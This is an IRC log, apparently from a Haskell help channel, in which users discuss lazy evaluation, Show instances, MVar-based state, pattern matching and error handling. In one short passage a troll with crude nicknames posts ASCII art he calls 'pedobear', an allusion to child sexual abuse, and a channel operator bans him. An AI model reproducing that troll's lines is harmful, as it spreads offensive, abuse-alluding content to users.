12:02:59 <applicative> arcatan, they are intended to solve the same problems, but I guess you know that.
12:03:56 <arcatan> yeah, that much i figured out
12:04:46 <applicative> The iteratee libraries are much less intelligible, I guess the element of 'inversion of control' is what makes for this.
12:05:13 <applicative> In the end, if you are dealing with developed libraries of either form, things are rather similar.
12:05:57 <untitled> is reply a pointer to function or is it a variable containing myFunctions return value here "let reply = myFunction"
12:06:01 <untitled> ?
12:06:34 <burbul> What on earth would you use a signed multiset for?
12:06:34 <sipa> untitled: ?
12:06:51 <applicative> > let reply = myfunction; myfunction = ord in reply 'a'
12:06:52 <lambdabot>   97
12:07:01 <aristid> applicative: iteratees aren't really a joy to use either IMHO
12:07:38 <untitled> when I use "reply" later in code, it calls the function every time?
12:07:58 <sipa> in which code?
12:08:17 <untitled> in if statement, for example
12:08:19 <jmcarthur> burbul: i've used one before. it was a shared data structure between two threads, one inserting elements and the other removing them. any that were left in the end were considered a "difference", and the sign told which thread had the element and which did not
12:08:30 <burbul> i see -- thanks
12:08:36 <tgeeky_> burbul: uh. It's complicated. I was thinking about using it in relations, so that a single signed multiset would have some sense of internal inversion: Like, the element "4" having "-3" copies would be the inverse of the element "-3" having 4 copies
12:08:44 <untitled> let ret = myfunction; if(isNothing ret) then doSmtngElse...
12:08:45 <sipa> untitled: which code exactly are you referring to?
12:08:53 <tgeeky_> burbul: which I don't think is related to how they are intended to be used
12:09:26 <barrucadu> untitled: "reply" is evaluated when it needs to be, and no more than it needs to be.
12:09:34 <tgeeky_> jmcarthur: did you need a multiset for that?
12:09:40 <applicative> aristid, I find it more intelligible after studying pipes, I guess not surprisiingly
12:09:48 <untitled> sipa: does it matter? I only ask if I get a return value back or a pointer to function
12:09:50 <jmcarthur> tgeeky_: yes, because some elements could appear more than once
12:10:08 <jmcarthur> tgeeky_: i wanted to verify that if it appeared n times in one thread that it also appeared n times in the other
12:10:14 <tgeeky_> jmcarthur: hmm. cool.
12:10:20 <burbul> untitled: I don't think pointers are HAskelly (as far as I know)
12:10:27 <burbul> You can pass round functions, though
12:10:34 <sipa> untitled: the fact that you talk about pointers means you're probably assuming it works in a different way than you think
12:10:57 <aristid> applicative: it being iteratees? well, perhaps more intelligible, but the iteratee equivalent of Source (or a Pipe with a Void output) is just a PITA to use IMHO
12:11:04 <applicative> it being iteratees
12:11:10 <untitled> sipa: so, it's a variable then?
12:11:20 <untitled> with myFunctions return value
12:11:29 <applicative> aristid, yes
12:11:51 <burbul> Untitled: are you talking about the > let reply = myfunction; myfunction = ord in reply 'a' ?
12:12:03 <untitled> no
12:12:07 <coppro> applicative: funny that you should mention that, I'm just starting to use Conduit now
12:12:09 <untitled> don't even know what that is
12:12:16 <aristid> applicative: i think oleg and the enumerator library call them enumerators
12:12:18 <burbul> Something Applicative typed above
12:12:21 <barrucadu> untitled: Lazy evaluation. If you do "let reply = myFunction in ..." and never reference "reply" in the body of the let, it is never evaluated
12:12:38 <barrucadu> If you evaluate it, it becomes the return value of myFunction
12:12:42 <coppro> applicative: but I think the most hilarious thing about Temko is that he says that the library should enforce all the invariants... and then complains that it violates the monad laws
12:12:47 <untitled> barrucadu: that's why I asked "if I use "reply" later on code"
12:13:03 <barrucadu> Well, "function pointer" is the wrong way to look at it
12:13:15 <sipa> untitled: in general - but there are optimizations which change this - return values are "thunks", a place in memory that either holds the real value, or information about how to compute it
12:13:40 <applicative> coppro,  yes, I was thinking of  writing, "I guess we should dump "Control.Monad", it cant enforce the monad laws"
12:13:57 <burbul> sipa: I found -- and still find, actually, because I'm pretty new to Haskell -- that I don't want to think about what's going on in memory.
12:14:07 <burbul> When you're starting off it's easy just to think about the things that are being referred to
12:14:12 <applicative> it totally leaves it up to those untrustworthy programmers
12:14:23 <jmcarthur> coppro: i think Temko is going with the "instances imply properties" convention
12:14:30 <untitled> sipa: barrucadu the thing is that the called function adds things to array, given as parameter and now I see things added multiple times
12:14:40 <burbul> Untitled: where is the code you're talking about?
12:14:46 <zezikaro> Can you create your own show function when deriving show?
12:14:52 <tgeeky_> zezikaro: no
12:15:03 <sipa> untitled: typically; you really don't need to know how exactly things are being executed at runtime
12:15:10 <untitled> burbul: it's big, takes time to do a test case
12:15:15 <applicative> deriving show means, 'i'm not writing it'
12:15:20 <sipa> untitled: unless you need efficiency or are dealing with non-pure library code
12:15:29 <sipa> untitled: can you post your full code somewhere+
12:15:32 <sipa> hpaste.org
12:15:57 <untitled> sipa: I better not :)
12:16:01 <applicative> zezikaro: if you make a newtype New = New Old, you can write a show instance for New by hand, perhaps taking advantage of the derived one for Old
12:16:13 <sipa> untitled: ?
12:16:20 <burbul> I think he means it's horrible
12:16:34 <untitled> burbul: got it right
12:16:51 <sipa> well it's hard to answer questions without seeing what you're referring to
12:17:02 <burbul> Untitled: I think the point is that it's very difficult to... sipa said it before I could get there.
12:18:29 <applicative> Data.Enumerator.Internal says Be careful when using the functions defined in this module, as they will allow you to create iteratees which violate the monad laws.
12:18:31 <zezikaro> applicative Sorry I don't understand that
12:19:27 <mzero> i think that was aimed at the other discussion
12:19:53 <mzero> zezikaro: I'm wondering why you were trying to provide a hand written instance for Show while deriving one at the same time
12:19:55 <applicative> zezikaro: you can write a new show instance for Integer if you wrap it in a newtype:  newtype NiceInt = Nice Integer  instance Show NiceInt where show (Nice 0) = "zero"
12:20:02 <hpaste> untitled pasted “lines” at http://hpaste.org/69162
12:20:09 <untitled> here
12:20:14 <untitled> sipa:
12:20:24 <zezikaro> >.<U
12:20:38 <zezikaro> this is too advanced for me still
12:20:39 <zezikaro> bah
12:20:51 <zezikaro> I have a list of tuples and I wanted to output the specific info of each
12:21:24 <applicative> zezikaro: what do you mean specific info
12:22:05 <applicative> for the items inside the tuple or the list of tuples?
12:22:09 <untitled> sipa: every time I print newLines, it contains 2 times previous itself)
12:22:12 <mzero> zezikaro: so just define your own function: showMyTuple :: (Thing, Thang) -> String
12:22:30 <mzero> then you can apply it in place of show -- there is nothing really magic about having a show instance
12:22:51 <mzero> other than the ability to use print    -- but    putStrLn . showMyTuple     is just fine
12:23:10 <barrucadu> untitled: What do you expect it to do?
12:23:16 <applicative> zezikaro: also, if you use record syntax to define the tuple type instead of recycing (a,b,..),  the derived show instance will be very informative....
12:24:01 <burbul> untitled: what is myFunction doing?
12:24:39 <untitled> barrucadu: myFunction returns ("line", Just Line) or ("err", Nothing)
12:24:43 <untitled> burbul: ^
12:24:49 <burbul> Is that program ever going to terminate?
12:25:01 <burbul> (Unless it sees an error )?
12:25:02 <untitled> burbul: that's not the point
12:25:06 <untitled> yes
12:25:11 <burbul> ok
12:25:18 <otters> how can I have two threads created by forkIO modify the state of the same object (using StateT)?
12:25:24 <otters> do I need to use an MVar or something of that sort
12:25:36 <zezikaro> thanks
12:25:39 <burbul> untitled: remind me what you were asking again ?  were you asking about reply?
12:25:45 <untitled> I expect this code to add lines to list and print that list every ioLoop iteration)
12:26:19 <untitled> burbul: yep, does it contain a return value (i.e. "Just Line") or a pointer to myFunction
12:26:38 <burbul> reply becomes a synonym for 'myFunction lines'
12:26:46 <burbul> So it contains a value
12:26:57 <untitled> ehh, that is not good
12:27:04 <burbul> Why?
12:27:22 <burbul> (I shouldn't have said ' contains'... it's not like a variable in an imperative language
12:27:29 <burbul> It's just like another name for ' myfunction lines')
12:27:29 <applicative> otters it is pretty common to use a ref type in that situation
12:27:35 <hpaste> mzero annotated “lines” with “lines (annotation)” at http://hpaste.org/69162#a69163
12:27:37 <otters> I see
12:27:40 <otters> okay
12:27:47 <untitled> burbul: you better say 'contains' when writing to me :)
12:27:50 <mzero> untitled: consider that re-write
12:27:51 <otters> should I write a custom MonadState instance for this situation
12:28:03 <burbul> In fact you could replace 'reply' with 'myFunction lines' throughout the code and it would function identically, except possibly for being a little slower
12:29:15 <burbul> The first argument of your tuple is a bit redundant and (as I understand it) not very Haskelly
12:29:22 <otters> applicative: MVar or IORef?
12:29:31 <burbul> The Just/Nothing already tells you whether you have a meaningful value or an error
12:29:37 <untitled> mzero: ok, thanks
12:29:47 <burbul> So there's no reason to be passing around "line"/"err"
12:30:19 <untitled> burbul: the code is much bigger and more complicated, this is only a test case, in fact I don't know what the return value is, it may be "circle"
12:30:43 <burbul> I would define a datatype for the return value, with one constructor for each kind of thing
12:30:44 <burbul> so
12:30:53 <untitled> I did that
12:30:57 <burbul> data XYZ = Line ... | Circle ... | ...
12:31:09 <untitled> is there any "typeOf" in haskell?
12:31:21 <burbul> You can pattern match directly against the types
12:31:25 <zezikaro> Don't you use pattern matching for that untitled?
12:31:25 <barrucadu> @hoogle typeOf
12:31:25 <lambdabot> Data.Typeable typeOf :: Typeable a => a -> TypeRep
12:31:26 <lambdabot> Data.Typeable typeOf1 :: Typeable1 t => t a -> TypeRep
12:31:26 <lambdabot> Data.Typeable typeOf1Default :: (Typeable2 t, Typeable a) => t a b -> TypeRep
12:31:30 <burbul> That's much better than trying to check type equality manually
12:31:40 <burbul> I really think you shouldn't be using that!
12:31:45 <burbul> You can say
12:31:48 <barrucadu> typeOf isn't a good thing
12:31:51 <burbul> case reply of
12:32:07 <burbul> Line text -> ...
12:32:09 <barrucadu> If you find yourself using it, you should probably rethink your design
12:32:16 <burbul> Circle centre radius -> ...
12:32:18 <burbul> etc.
12:32:27 <untitled> ok, I'll use pattern mathing :)
12:32:38 <BigDongStudios> Hi
12:32:49 <applicative> otters, this would depend on whether the things the forked actions are doing could compete in what the did to the ref, and you needed to manage this
12:33:19 <applicative> here's a simpleminded example i wsa thinking of otters http://shootout.alioth.debian.org/u64q/program.php?test=threadring&lang=ghc&id=1
12:33:24 <SmallDongStudios> how do I Haskell?
12:33:33 <barrucadu> @where LYAH
12:33:34 <lambdabot> http://www.learnyouahaskell.com/
12:33:37 <barrucadu> @where RWH
12:33:37 <lambdabot> http://www.realworldhaskell.org/blog/ http://book.realworldhaskell.org/read/
12:33:40 <barrucadu> Read those
12:33:47 <BigDongStudios> ………………….._,,-~’’’¯¯¯’’~-,, ………………..,-‘’ ; ; ;_,,---,,_ ; ;’’-,…………………………….._,,,---,,_ ……………….,’ ; ; ;,-‘ , , , , , ‘-, ; ;’-,,,,---~~’’’’’’~--,,,_…..,,-~’’ ; ; ; ;__;’-, ……………….| ; ; ;,’ , , , _,,-~’’ ; ; ; ; ; ; ; ; ; ; ; ; ; ; ; ¯’’~’-,,_ ,,-~’’ , , ‘, ;’, ……………….’, ; ; 
12:33:54 <BigDongStudios> that's pedobear if you ever saw one
12:34:06 <SmallDongStudios> your code seems broken bro
12:34:16 <BigDongStudios> How do I into haskell?
12:34:26 --- mode: ChanServ set +o Cale
12:34:36 * tgeeky_ turns on the banhammer signal
12:35:18 <zezikaro> xD
12:35:23 <BigDongStudios> Hi nick
12:35:32 <applicative> hm
12:35:39 <BigDongStudios> So I've been having trouble with haskell
12:35:59 <Cale> Is it an actual problem, or is it something I'm going to have to ban you for?
12:36:00 <BigDongStudios> The part where leoric teleports to you
12:36:02 <BigDongStudios> and summons goons
12:36:06 --- mode: Cale set +b *!*@gateway/web/freenode/ip.82.25.201.214
12:36:06 --- kick: BigDongStudios was kicked by Cale (BigDongStudios)
12:36:10 --- mode: Cale set -o Cale
12:36:39 <applicative> whats the difference between Cale and @Cale?
12:36:50 <applicative> the latter seems more godlike somehow
12:36:53 <hpc> applicative: one is a bareword and the other is an array
12:36:58 <hpc> ;)
12:37:20 <tgeeky_> applicative: for one of them, (.) = fmap, for the other, (.) = fmap (ban)
12:37:28 <sipa> hpc: this is not #perl!
12:37:36 <applicative> or mapM_ ban
12:38:32 <otters> applicative: would it be a silly idea to try and write a MonadState instance where the state is an MVar
12:38:57 <hpc> otters: it could possibly make sense
12:39:12 <otters> where get and put automatically read/write the MVAR
12:39:14 <otters> *MVar
12:39:26 <otters> ghci doesn't like my attempt at an instance declaration though
12:39:29 <hpc> instance (MonadReader (MVar r) m, MonadIO m) => MonadState (MVar r) m where ...
12:39:43 <otters> Huh
12:39:46 <otters> okay, I'll try that
12:39:52 <hpc> maybe
12:40:16 <hpc> you need to know how to ask for the MVar, and you need to be able to lift the IO actions that mutate it into m
12:40:22 <roconnor> hpc: that doesn't seem quite right
12:40:24 <Cale> That actually sounds a bit different from what you're looking for...
12:40:28 <hpc> which doesn't technically require either of those classes
12:40:29 <otters> why MonadReader?
12:40:39 <hpc> otters: for ask
12:40:40 <otters> oh
12:40:42 <roconnor> instance (MonadReader (MVar r) m, MonadIO m) => MonadState r m where ?
12:40:44 <Cale> also, that instance is going to overlap like crazy
12:40:51 <hpc> Cale: yeah...
12:40:53 <Cale> so it's practically useless
12:41:05 <zezikaro> Is it possible to do two different matches that result in the same result?
12:41:08 <zezikaro> like
12:41:24 <roconnor> zezikaro: yes, the first pattern will be used.
12:41:25 <zezikaro> foo ([] _) = foo(_ []) = error 'foo is empty'
12:41:28 <otters> "illegal instance declaration for `MonadState r m'"
12:41:37 <roconnor> er
12:41:41 <otters> "All instance types must be of the form (T a1 ... an)"
12:41:44 <zezikaro> so both foo [] _  and foo _ [] result in the same function
12:41:44 <Cale> zezikaro: syntax error...
12:41:49 <otters> should I just turn on FlexibleInstances?
12:41:56 <roconnor> well, zezikaro well, the two matchs have to be on two different lines
12:41:58 <zezikaro> Cale I'm just asking if it it supports it
12:42:01 <Botje> zezikaro: foo xs ys | null xs ||null ys =
12:42:04 <Botje> zezikaro: otherwise, no :)
12:42:10 <hpc> zezikaro: a somewhat cheating way would be.. what Botje said
12:42:15 <Cale> zezikaro: oh, you mean (foo []) _ = (foo _) [] = ...
12:42:26 <Cale> zezikaro: you got the brackets the wrong way around
12:42:38 <Cale> zezikaro: and no, you can't do that, but you can just fall through
12:43:06 <Cale> foo (x:xs) (y:ys) = ...; foo xs ys = error "empty"
12:43:34 <otters> Okay it wants me to turn on four extensions to declare that instance
12:43:48 <Cale> otters: Also, the instance will not be useful to you
12:43:50 <parcs`> why doesn't haskell support chained bindings anyway? eg x = y = 5
12:43:51 <zezikaro> basically if either arg a or b is an empty list
12:43:51 <hpc> otters: yeah, you don't want to write that exact instance
12:43:55 <zezikaro> i want to throw the same error
12:43:58 <zezikaro> that's what i'm after
12:43:59 <otters> okay
12:44:01 <otters> so
12:44:07 <zezikaro>  <Botje> zezikaro: foo xs ys | null xs ||null ys =
12:44:10 <zezikaro> is it || or | ?
12:44:11 <hpc> parcs`: because it would make the grammar unfun
12:44:13 <otters> any better ideas?
12:44:20 <zezikaro> neither worked >.<U
12:44:25 <hpc> parcs`: you can fake it with let and top-level patterns, if you feel the urge
12:44:44 <zezikaro> modifyTape (Tape [] _ _) newSymbol Left || (Tape _ _ []) newSymbol Right = error "No remaining tape"
12:44:49 <hpc> (foo, bar) = let foo = bar; bar = ... in (foo, bar)
12:44:54 <dmwit> otters: newtype
12:45:02 <otters> how
12:45:10 <Cale> otters: I'm assuming you want something like  newtype IOWithMVar r a = MM (ReaderT (MVar r) IO a)
12:45:17 <otters> oh, possibly
12:45:23 <otters> except state
12:45:44 <dmwit> instance MonadState (IOWithMVar s) s where ...
12:46:01 <burbul> I want to write a function :: Char -> Char   that maps '1' to '₁', '2' to '₂', and so on.
12:46:12 <burbul> Is there a nicer way of doing it than with 10 clauses?
12:46:33 <otters> IOWithMVar is not applied to enough type arguments
12:46:35 <dmwit> I was going to suggest newtype ReaderToState m a = ReaderToState (m a) and
12:46:56 <dmwit> instance MonadReader m (MVar s) => MonadState (ReaderToState m) s
12:46:58 <dmwit> but yeah
12:47:00 <Cale> > let foo c = toEnum (fromEnum c - fromEnum '1' + fromEnum '₁') in foo '3'
12:47:01 <lambdabot>   *Exception: Prelude.Enum.().toEnum: bad argument
12:47:07 * dmwit -> shopping
12:47:07 <otters> maybe that's a better idea
12:47:08 <Cale> errr
12:47:14 <otters> except I want to use state
12:47:19 <otters> oh
12:47:20 <parcs`> burbul: depends on the position of _1 etc in the Char enumeration
12:47:20 <otters> but I can
12:47:32 <nonefool> Cale: a few days ago you helped me with a superclass bug (Super, Duper, Foo etc), can you tell if the bug is the same as the one described in the following ticket? http://hackage.haskell.org/trac/ghc/ticket/6117
12:47:40 <Cale> > let foo :: Char -> Char; foo c = toEnum (fromEnum c - fromEnum '1' + fromEnum '₁') in foo '3'
12:47:42 <lambdabot>   '\8323'
12:48:11 <burbul> I was wondering if I could do something utilising the strings "0123456789" and "₀₁₂₃₄₅₆₇₈₉"...
12:48:26 <parcs`> 芃
12:48:33 <otters> the second argument of MonadReader should have kind * -> *, but MVar s has kind *
12:48:48 <Cale> nonefool: yeah, that looks like it
12:48:52 <burbul> the enum thing is neat, but feels a little risky in that it relies on the positions of characters in the tables
12:49:08 <Cale> burbul: sure, you could
12:49:17 <burbul> ah -- fromList
12:49:17 <Cale> burbul: zip those together
12:49:19 <burbul> yup
12:49:23 <burbul> thanks
12:49:23 <Cale> and then use lookup
12:49:33 <arnsholt> Is making a show that can't be read back in considered a hangable offense, or just bad style?
12:49:42 <burbul> oh, that's right -- I forgot you can use lookup without making a Map. that's definitely the nicest solution.
12:49:47 <Cale> arnsholt: Sometimes bad style.
12:50:25 <Cale> arnsholt: Sometimes it's okay, because there's no reasonable way to write such an instance. But whatever you do show should be along the lines of information useful to someone who is debugging code
12:51:06 <Cale> Moreso than prettyprinting.
12:52:12 <burbul> @hoogle [(a,b)] -> a -> b
12:52:13 <lambdabot> Prelude lookup :: Eq a => a -> [(a, b)] -> Maybe b
12:52:14 <lambdabot> Data.List lookup :: Eq a => a -> [(a, b)] -> Maybe b
12:52:14 <lambdabot> Language.Haskell.TH.Syntax RecConE :: Name -> [FieldExp] -> Exp
12:52:22 <burbul> There is no list equivalent of (!) ?
12:52:42 <Cale> There's !!
12:52:49 <Cale> Maybe is better
12:53:09 <burbul> Yup, but in this case I am going to have to call fromJust if I use lookup
12:53:24 <Cale> It's probably better to do something smarter than calling fromJust here
12:53:34 <burbul> What would you suggest?
12:53:35 <Cale> What if your character isn't a digit?
12:53:36 <hpc> burbul: you know for a fact that you'll never look up a key that isn't in the list?
12:53:57 <burbul> In that I'm going only going to be utilising it on the  value obtained by applying
12:53:59 <timthelion> String isn't utf-8?
12:54:01 <burbul> show to a positive integer
12:54:05 <burbul> I think it's pretty safe
12:54:24 <burbul> I.e. it's all right be wrapped inside a function of type
12:54:27 <burbul> Int -> String
12:54:28 <Cale> burbul: It's safe right up until it crashes your program when applied to a negative one ;)
12:54:33 <burbul> Yes
12:54:42 <burbul> Thing is, I don't really know how to add error handling without making everything look horrible
12:54:45 <hpc> timthelion: String is [Char], Char is "character"
12:54:51 <burbul> There's an article called eight error handling strategies in Haskell
12:55:01 <timthelion> hpc: character is unsigned byte?
12:55:03 <hpc> there's no specific encoding specified
12:55:09 <burbul> and my collaborator and I were using the 'fail in an arbitrary monad' for a long time
12:55:21 <arnsholt> Cale: Yeah, that's what I figured, but it's always good to ask people more familiar with the culture
12:55:25 <burbul> (That's a strategy from the article)
12:55:39 <hpc> > "∪ℕi⊂∅∂∃"
12:55:40 <lambdabot>   "\8746\8469i\8834\8709\8706\8707"
12:55:43 <burbul> Then I got told (here, I think)  that was a horrible thing to do
12:55:47 <timthelion> hpc: My program, which uses Strings for filenames has a utf-8 compat bug.  It's borking the letter ý into Ã½
12:55:48 <Cale> yeah
12:55:51 <tgeeky_> roconnor: in http://hackage.haskell.org/packages/archive/transformers/0.3.0.0/doc/html/src/Control-Applicative-Backwards.html <-- here, what do you mean by "Derived instance"? "Derived by hand?"
12:55:52 <Cale> Use Maybe if you mean Maybe
12:55:53 <burbul> And I haven't really known what to do with errors since
12:56:05 <timthelion> Perhaps gtk's file dialog is messing it up?
12:56:05 <Cale> Maybe has a lot of library support
12:56:07 <hpaste> kane pasted “Collatz” at http://hpaste.org/69164
12:56:13 <arnsholt> In this case, it's so that I get useful data when debugging my program, rather than hundreds (if not thousands) of lines of gobbledygook
12:56:24 <hpc> timthelion: the problem is with whatever produces or consumes the strings
12:56:25 <otters> Cale: I'm still stuck, and I don't understand dmwit's example
12:56:27 <burbul> Well, when I get up to the Show instance in which I'm calling this function, what I do with the 'Nothing'?
12:56:27 <otters> sorry to bother you
12:56:36 <hpc> if you get it from a Handle, hSetEncoding
12:56:46 <hpc> or maybe just use Text
12:56:58 <Cale> > map (\c -> fromMaybe c . lookup c $ zip "0123456789" "₀₁₂₃₄₅₆₇₈₉") (show 23482791)
12:57:00 <timthelion> hpc: OK. it would seem there is a bug in gtk2hs then, since writeFile is probably not the source of the problem.
12:57:00 <lambdabot>   "\8322\8323\8324\8328\8322\8327\8329\8321"
12:57:20 <Cale> > text $ map (\c -> fromMaybe c . lookup c $ zip "0123456789" "₀₁₂₃₄₅₆₇₈₉") (show 23482791)
12:57:22 <lambdabot>   mueval-core: <stdout>: hPutChar: invalid argument (Invalid or incomplete mu...
12:57:26 <Cale> aw
12:57:29 <kane77> I'm trying to make this more efficient: http://hpaste.org/69164 basically euler problem 14, or in other words longest collatz sequence for starting number <1000000..
12:58:04 <Cale> burbul: Probably if it's a character which isn't a digit, you want to leave it alone
12:58:31 <Cale> > map (\c -> fromMaybe c . lookup c $ zip "0123456789" "₀₁₂₃₄₅₆₇₈₉") (show (-23482791))
12:58:33 <lambdabot>   "-\8322\8323\8324\8328\8322\8327\8329\8321"
12:58:49 <burbul> I really think if the outer function is called with a negative argument (equivalently, the inner function is called with something that isn't one of 0123456789)
12:58:53 <burbul> Then that constitutes an error
12:58:58 <burbul> I don't want to have it hidden silently
12:59:19 <burbul> I could replace show with something that allows the error to percolate upwards
12:59:24 <burbul> But I think it would make my code pretty unreadable
12:59:26 <tgeeky_> burbul: you don't have a different -, so ignore it alltogether
13:00:00 <burbul> The right domain for this function is {nonnegative integers}
13:00:01 <Cale> burbul: Wait, why are you doing this in a show instance?
13:00:15 <Cale> This isn't what show instances are for.
13:00:16 <burbul> I have a bunch of lambda-variables which I'm pretty printing
13:00:36 <burbul> one sec, let me find a declaration
13:00:46 <burbul> data LambdaVar = LambdaVar String ID deriving (Eq, Ord)
13:00:54 <Cale> The show instance of a data structure should usually produce as close as possible to source code for constructing that structure as you can manage :)
13:01:01 <burbul> The String is the actual name of the variable (e.g. "x")
13:01:19 <burbul> ID is a synonym for Int
13:01:32 <burbul> and the ID is produced by alpha-conversion (to avoid name collision)
13:01:45 <burbul> When printing it out, I wanted to print the ID as a subscript to make it more readable.
13:01:58 <burbul> I never need to parse these things, but if I wanted to I could write a parser that made sense of the subscript.
13:02:23 <Cale> I would just make a separate prettyprinter in this case
13:02:24 <burbul> w you said source code for constructing that structure
13:02:29 <burbul> hmm...
13:02:38 <burbul> I've not been using show for that at all  (which is possibly bad)
13:03:05 <burbul> I tend to just use show to mean ' print in a human readable fashion'
13:03:43 <burbul> Regardless, even if I made my own type class which was like Show (but meant for pretty printing)
13:03:51 <burbul> I'm not sure what I'd do with the error case...
13:04:55 <KeiKun> anyone here?
13:05:03 <barrucadu> No
13:05:08 <KeiKun> :(
13:05:16 <burbul> It's really convenient to be able to write things like    "a_unique " ++ show i ++ "." ++ show drs", and I don't know what I'd do if show (or its equivalent) could return an error
13:05:26 <Cale> only 909 robots
13:05:26 <applicative> kane77 I think this problem is usually approached with some sort of 'memoization' to prevent repeated calculation
13:05:34 <KeiKun> anyone know a irc bot that sends svn message to irc?
13:06:32 <hpc> KeiKun: you can write one, and write a script that you can attach to svnserve as a post-commit hook
13:06:49 <KeiKun> hmm
13:07:57 <Cale> burbul: Well, to be fair, there are cases where you just want the program to die when some invariant isn't satisfied. It's a little weird for such a thing to happen inside a Show instance, but if you want, go ahead :)
13:08:15 <applicative> kane77: also,  are you sure Word is going to work
13:08:24 <applicative> > maxBound :: Word
13:08:25 <lambdabot>   18446744073709551615
13:08:27 <Cale> But yeah, I think the reason we tend to give this advice is that errors like this can generally become quite hard to track down.
13:09:38 <Cale> Whereas if you use Maybe, you're forced to think about and handle the failure case, which, even if you respond by just printing another error, that error message will now be specific to the usage site of the function, rather than an error which could have been caused from 20 different places in your code.
13:09:55 <burbul> It would be nice to have something like an assert
13:10:02 <Cale> an extreme case of this is something like  head
13:10:10 <Cale> *** Exception: Prelude.head: empty list
13:10:15 <Cale> is a horrible thing to see :)
13:10:16 <rasfar> I spend a lot of time waiting for "Updating documentation index ~/.cabal/share/doc/index.html"
13:10:19 <burbul> I don't really know how exceptions work in Haskell...
13:10:23 <rasfar> (i'm buildilng profiling versions...)
13:10:26 <burbul> @hoogle Exception
13:10:26 <lambdabot> Control.Exception module Control.Exception
13:10:27 <lambdabot> Control.Exception.Base class (Typeable e, Show e) => Exception e
13:10:27 <lambdabot> Control.Exception class (Typeable e, Show e) => Exception e
13:10:34 <burbul> You have to put them into type signatures everywhere?
13:10:52 <Cale> burbul: The exceptions thrown by error are technically catchable, but not really intended to be caught.
13:10:53 <rasfar> is it safe to set documentation: False in my ~/.cabal/config, then set it True after?
13:11:08 <rasfar> will the next package installation rebuild all docs? <-- the actual question
13:11:24 <Cale> (you have to ensure that the value which throws the error is evaluated inside of a particular IO action, which can be tricky to manage)
13:11:49 <burbul> ahhhh... throw :: Exception e => e -> a
13:11:58 <burbul> I assumed that if you used Exceptions, you had to modify all of your types to
13:11:58 <Cale> burbul: The IO monad itself has an extensible system of exceptions (as well as an old one from way back in Haskell 98)
13:11:58 <hpc> rasfar: maybe?
13:12:01 <burbul> Indicate that something could be thrown
13:12:11 <burbul> This is much nicer
13:12:16 <hpc> it'll definitely install haddock when you install an updated version of something you already have
13:12:28 <geekosaur> rasfar, later builds that want to reference docs for their dependencies will produce warnings about inability to do so.  cabal won't go back and rebuild stuff just because docs are missing
13:12:29 <rasfar> would be nice to know for sure; i don't want to repeat this process twice!
13:12:50 <burbul> I'll modify the function so instead of calling fromJust it  uses fromMaybe + throw
13:12:51 <Cale> Oh, that throw is weird
13:12:54 <Cale> I've never used that
13:12:54 <burbul> Thank you very much!
13:12:56 <rasfar> is there a way to rebuild all docs for installed packages?
13:12:56 <burbul> oh
13:13:00 <burbul> Then what should I be using?
13:13:12 <hpc> @hoogle Exception e => e -> IO a
13:13:12 <lambdabot> Control.Exception.Base throwIO :: Exception e => e -> IO a
13:13:12 <lambdabot> Control.Exception throwIO :: Exception e => e -> IO a
13:13:12 <lambdabot> Control.OldException throwIO :: Exception e => e -> IO a
13:13:17 <Cale> I guess you could... usually for that sort of error,  'error' is sufficient.
13:13:23 <Cale> :t error
13:13:24 <lambdabot> forall a. [Char] -> a
13:13:25 <kane77> applicative, yep, thats what I thought.. well
13:13:27 <burbul> I get confused between error and fail
13:13:28 <rasfar> (just the docs, mind you) ... i'll look into that
13:13:32 <tertl3> is there any pros to using Haskell in a linux environment?
13:13:38 <burbul> Is error the one that just halts the program?
13:13:43 <hpc> burbul: yes
13:13:50 <burbul> (I think the behaviour of fail was changed at some point and
13:13:51 <Cale> tertl3: Everyone uses linux, so stuff has a better chance of working.
13:14:00 <burbul> It means that a lot of what you read online is a bit outdated/confusing)
13:14:09 <tertl3> Cale ok, thanks
13:14:10 <burbul> Thanks
13:14:14 <tertl3> gonna try centos
13:14:18 <Cale> tertl3: There's a lot of stuff which is a pain or impossible to make work on Windows.
13:14:31 <hpc> and other stuff which is just as impossible on Mac
13:14:40 * geekosaur does not know if there's anything better than looping over ghc-pkg list output with cabal haddock
13:14:44 <tertl3> Cale, thats what I suspected
13:14:49 <rasfar> thanks geekosaur
13:15:02 <hpc> geekosaur: it doesn't recompile the packages, at least
13:15:03 <tertl3> I have the GHC in windows, but I thought Haskell was a linux thing
13:15:42 <burbul> I've got my pretty well using Haskell on Windows (with CygWin)
13:15:45 <rasfar> right, that's a decent solution; because i don't care to have these doc building delays interspersed with building, while i try to determine which profiling packages need to be installed
13:15:49 <burbul> Works a lot better than most languages
13:15:54 <burbul> Not least because of cabal being nice
13:16:06 <kane77> applicative, currently I'm trying something like this http://hpaste.org/69165 but it's actuall taking longer.. probably because of ++
13:16:18 <burbul> I think the main headaches I've hit are related to Unicode -- but you don't need that for many applications
13:16:20 <Cale> tertl3: Theoretically, it ought to work just fine on Windows, but in practice, I think a very large fraction of Haskell users are on Linux anyway.
13:17:23 <Cale> After all, Simon Peyton Jones is working for Microsoft Research, so at least GHC has to work :D
13:17:37 <tertl3> heh
13:17:40 <adu> SPJ rocks
13:17:57 <tertl3> what GHC are you guys on?
13:18:09 <adu> hpc: what's impossible on mac?
13:18:22 <hpc> adu: gtk, i think
13:18:23 <tertl3> i have 2011.4.0
13:18:28 <jonaskoelker> right-clicking :)
13:18:31 <hpc> or if it's possible, not without much headache
13:18:44 <hpc> of not-worth-it proportions
13:18:51 <adu> jonaskoelker: right-clicking is possible, and easy, I have no idea what you're talking about
13:19:53 <adu> (1) I have a mac with an external mouse (with 3 buttons), (2) with the builtin trackpad 2-fingered click is right-click
13:20:37 <geekosaur> magic mouse can be painful without magicprefs/bettertouchtool (although control-click works)
13:21:15 <adu> hpc: I use quite a few gtk apps on macosx
13:21:22 <adu> hpc: could you be more specific?
13:21:33 <hpc> adu: gtk2hs
13:21:42 <adu> oic
13:22:07 <hpc> i also don't think there's any cocoa bindings
13:22:12 <hpc> which means you're stuck with wx
13:22:28 <adu> hpc: there were some cocoa bindings that yi was using a long time ago
13:22:54 <kane77> what does oic stand for?
13:23:02 <jmcarthur> "oh i see"
13:23:43 <adu> kane77: what jmcarthur said
13:24:11 <kane77> oic :D
13:24:44 <adu> hpc: there was a lot of hype about a year ago that gtk 2.whatever was going to change everything
13:29:12 <Cale> tertl3: I'm using GHC 7.4.1
13:30:12 <mzero> tertl3: next release of HaskellPlatform, 2012.2.0.0 - due this week - will have GHC 7.4.1
13:30:25 <tertl3> ahhh
13:30:37 <tertl3> maybe the windows version is ok?
13:31:18 <burbul> As I said, I've been using Haskell on Windows without any problems (bar Unicode)
